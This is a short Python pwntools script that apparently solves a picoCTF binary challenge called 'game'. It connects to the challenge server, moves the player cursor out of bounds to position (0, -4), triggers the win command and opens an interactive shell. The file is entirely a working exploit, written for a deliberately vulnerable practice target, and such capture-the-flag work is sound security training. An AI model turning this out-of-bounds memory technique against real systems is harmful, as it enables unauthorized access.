from pwn import *

#init

e = ELF('./game')

context.binary = e

#p = process(e.path)
p = remote('saturn.picoctf.net', 60344)

#funcs

def incx():
    p.sendlineafter('..X', 's')

def decx():
    p.sendlineafter('..X', 'w')

def incy():
    p.sendlineafter('..X', 'd')

def decy():
    p.sendlineafter('..X', 'a')

def pos():
    p.recvuntil(': ')
    return map(int, p.recvline(keepends = False).split(b' '))

def mov(x, y):
    xx, yy = pos()
    while yy < y:
        incy()
        yy += 1
    while yy > y:
        decy()
        yy -= 1
    while xx < x:
        incx()
        xx += 1
    while xx > x:
        decx()
        xx -= 1

def chg(c):
    if isinstance(c, bytes):
        c = c[0]
    p.sendlineafter('..X', 'l{:c}'.format(c))

def chgat(x, y, c):
    chg(c)
    mov(x, y)

def wingame():
    p.sendlineafter('..X', 'p')

#vars

win = e.sym['win']

#exploit

mov(0, -4)
wingame()

#pray for flag

p.interactive()
